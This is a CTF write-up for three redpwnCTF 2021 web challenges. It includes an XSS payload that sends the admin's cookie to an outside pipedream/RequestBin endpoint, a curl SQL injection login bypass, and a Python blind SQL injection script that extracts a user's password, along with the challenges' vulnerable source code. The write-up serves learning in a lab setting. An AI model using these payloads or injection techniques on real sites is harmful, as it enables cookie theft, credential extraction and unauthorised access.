## 2021-07-09
#ctf-writeup 

Link: https://ctf.redpwn.net/

***

# pastebin-1
### Category: web
### Author: BrownieInMotion

## Description
Ah, the classic pastebin. Can you get the admin's cookies?

## Solution
For this challenge, we are given two links. One is a mock pastebin website where you can enter text, submit it, and be given a link to where it persists. The second link is a website that allows you to redirect a bot to a specific URL.

Based on the nature of the websites and the description it's fairly clear that this is a classic XXS challenge. The mock pastebin website allows JavaScript that we write to be injected into the DOM of whoever visits the page. We can exploit this to steal a person's cookie. First, I created a public [RequestBin](https://requestbin.com/) as an endpoint for our exploit. Then I created a new paste with the following content:

```html
<script>
document.write('<img src="https://en2enweozjgy8.x.pipedream.net?c='+document.cookie+'" />');
</script>
```

I then took the link to the newly created paste and fed it to the admin bot. The flag then appeared as a GET parameter in the RequestBin.
![[../Files/inspect-me-requestbin.png]]

When the admin bot visits our link the JavaScript within the `<script>` tag gets run. The script tries to create an image with the source of our RequestBin and the admin's cookie as GET parameter. The admin bot will then make a request to our endpoint which we can capture, thus exposing the cookie (flag).

## Flag
`flag{d1dn7_n33d_70_b3_1n_ru57}`

***

# secure
### Category: web
### Author: BrownieInMotion

## Description
Just learned about encryption—now, my website is unhackable!

## Solution
For this challenge, we are given a web page with a simple login screen. Attempting to log in with some random credentials will show the SQL query that was run by the backend.

![[../Files/secure-login.png]]

We are also given the application code in `index.js`. Reading through this code we can see that it is SQL injectable.

```js
app.post('/login', (req, res) => {
  if (!req.body.username || !req.body.password)
    return res.redirect('/?message=Username and password required!');

  // highlight-start
  const query = `SELECT id FROM users WHERE
          username = '${req.body.username}' AND
          password = '${req.body.password}';`;
  // highlight-end
  try {
    const id = db.prepare(query).get()?.id;

    if (id) return res.redirect(`/?message=${process.env.FLAG}`);
    else throw new Error('Incorrect login');
  } catch {
    return res.redirect(
      `/?message=Incorrect username or password. Query: ${query}`
    );
  }
});
```

Attempting to SQL inject doesn't seem to work. Trying to use the username `' OR 1=1;  --  ` produces the following output:

![[../Files/secure-login-inject.png]]

The username injection here seems to be encoded in base64 which is preventing the injection from completing. The source of the login page supports this, showing that the username and password inputs are base64 encoded on the client-side before being sent to the server using the `btoa()` function.

```html
<script>
(async() => {
    await new Promise((resolve) => window.addEventListener('load', resolve));
    document.querySelector('form').addEventListener('submit', (e) => {
    e.preventDefault();
    const form = document.createElement('form');
    form.setAttribute('method', 'POST');
    form.setAttribute('action', '/login');

    // highlight-start
    const username = document.createElement('input');
    username.setAttribute('name', 'username');
    username.setAttribute('value',
        btoa(document.querySelector('#username').value)
    );

    const password = document.createElement('input');
    password.setAttribute('name', 'password');
    password.setAttribute('value',
        btoa(document.querySelector('#password').value)
    );
    // highlight-end

    form.appendChild(username);
    form.appendChild(password);

    form.setAttribute('style', 'display: none');

    document.body.appendChild(form);
    form.submit();
    });
})();
</script>
```

We can pass our injection to the server using a tool like curl to ensure our username/password does not get encoded. I found that it was easier to inject on the password instead of the username. Using the following command will print the flag url encoded:

```shell
$ curl -X POST -d "username=l33t" -d "password=' OR 1=1;  --  " https://secure.mc.ax/login
Found. Redirecting to /?message=flag%7B50m37h1n6_50m37h1n6_cl13n7_n07_600d%7D
```

We can then use a tool like [CyberChef](https://gchq.github.io/CyberChef/) to easily decode the flag.

![[../Files/secure-cyberchef.png]]

## Flag
`flag{50m37h1n6_50m37h1n6_cl13n7_n07_600d} `

***

# cool
### Category: web
### Author: Arinerron & BrownieInMotion

## Description
Aaron has a message for the cool kids. For support, DM BrownieInMotion.

## Solution
For this challenge, we are given another simple login screen. It also looks like we can register an account. If we register an account and log in, the following message is shown:

![[../Files/cool-login-message.png]]

This indicates that there is a user called ginkoid that we need to log in as. Trying to register a new user with this account will tell us that the username is taken, indicating that the user does exist in the database.

In addition to the website, we are also given the source code in `app.py`. By the looks of it, this is a Flask application running SQLite3 as the database. When the app is started the `init()` function is called which generates the database tables and adds the ginkoid user.

```python
# put ginkoid into db
ginkoid_password = generate_token()
execute(
    'INSERT OR IGNORE INTO users (username, password)'
    f'VALUES (\'ginkoid\', \'{ginkoid_password}\');'
)
execute(
    f'UPDATE users SET password=\'{ginkoid_password}\''
    f'WHERE username=\'ginkoid\';'
)
```

The password for ginkoid is generated using the `generate_token()` function, which creates a random string of 32 alphanumeric characters.

Looking further at the code, we can see that most of the SQL queries are vulnerable to SQL injection. This is because they are build using f-strings, which is just a fancy string formatting mechanism. However, attempting to SQL inject on the login query will not work, as usernames with any non-alphanumeric characters (as defined by the `allowed_characters` set) will be denied.

```python
allowed_characters = set(
    'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789'
)

...

def check_login(username, password):
    # highlight-start
    if any(c not in allowed_characters for c in username):
        return False
    # highlight-end
    correct_password = execute(
        f'SELECT password FROM users WHERE username=\'{username}\';'
    )
    if len(correct_password) < 1:
        return False
    return correct_password[0][0] == password
```

This same check for non-alphanumeric characters happens in the `create_user()` function as well, however, it only checks the username input and **not** the password input. This means that we can SQL inject only when setting the password when registering a new user.

```python
def create_user(username, password):
    # highlight-start
    if any(c not in allowed_characters for c in username):
        return (False, 'Alphanumeric usernames only, please.')
    # highlight-end
    if len(username) < 1:
        return (False, 'Username is too short.')
    if len(password) > 50:
        return (False, 'Password is too long.')
    other_users = execute(
        f'SELECT * FROM users WHERE username=\'{username}\';'
    )
    if len(other_users) > 0:
        return (False, 'Username taken.')
    # highlight-start
    execute(
        'INSERT INTO users (username, password)'
        f'VALUES (\'{username}\', \'{password}\');'
    )
    # highlight-end
    return (True, '')
```

The injectable query is an `INSERT` statement. One thing to note is that the password must be less than 50 characters long, thus limiting the length of our SQL injection. The process to extract ginkoid's password is the following:

1. Create a new user with any username and a password that is one character of ginkoid's password at some index i, starting with i=0.
    - This can be done by injecting a sub-query that selects ginkoid's password from the `user` table and taking a substring at index i of length 1.
    - The following injection works to create the password `'||(SELECT substr(password,1,1) FROM users))--`.
2. Do a blind SQL injection on the newly created user. Iterate through each alphanumeric character and try to log in. When you log in successfully, you know the character that is at index i of ginkoid's password.
3. Repeat this process 32 times, incrementing i by 1 each time. Gradually extract ginkoid's password one character at a time.

I wrote the following script to automate this process:

```python
import requests

allowed_chars = list('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789')

def main():
	user_prefix = "deadbeef"
	endpoint = "https://cool.mc.ax/"

	password = ""

	for i in range(1,33):
		current_user = user_prefix + allowed_chars[i]

		print("creating user " + current_user)

		obj = {
			'username': current_user,
			'password': f"'||(SELECT substr(password,{i},1) FROM users))--"
		}
		ret = requests.post(endpoint + "register", data=obj)

		j = 0
		while (True):
			obj2 = {
				'username': current_user,
				'password': allowed_chars[j]
			}
			login_ret = requests.post(endpoint, obj2)

			if "You are logged in!" in login_ret.text:
				password += allowed_chars[j]
				print(password)
				break

			j += 1

main()
```

Running this script gets the password `eSecFnVoKUDCfGAxfHuQxuootJ6yjKX3`. When we log in to ginkoid using that password we are given an audio file with the name `flag-at-the-end-of-file.mp3`. Running cat on the file gives us the flag.

```shell
$ cat flag-at-the-end-of-file.mp3
...
��%����{
1���i���g��ʔ'I��õ��v�߁3�~�6
  \Q�"����B(q6�C��A3gV{?�7UJ�O�71�,<$�ʙ�|F�@T�2�m���*e����z\�d�l���1�u+�&�U�ȧg!�!�;�,�/)�f:��x�$�VD�$)�*3�8>�ƛ<v��b��eI [6Y(�5Vt7B      sd��)�ZY��n�����
����m���-�!p4��d&�"�@
                     :@�ss^��=��蠨I�1�н���u�X�i����d���~C�k
�wLAMEUU�HDH#���@D���E*Bb������f���,L��"����c0Q!�1��ƴ��7�ԃ8�<�!Q�F*��%QD1�TU�~
 MI�0��4�UUUUUUUUUUUUUUUUULAME3.100UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUULAME3.100UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUULAME3.100UU UUUUUUU(�D�k�4�UUUUULAME3.100UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUULAME3.100UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUULAME3.100UUUUUUUUUUUUUUUUUUUUUU��d��BE@@
 � 4�UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUflag{44r0n_s4ys_s08r137y_1s_c00l}
```

## Flag
`flag{44r0n_s4ys_s08r137y_1s_c00l}`

***
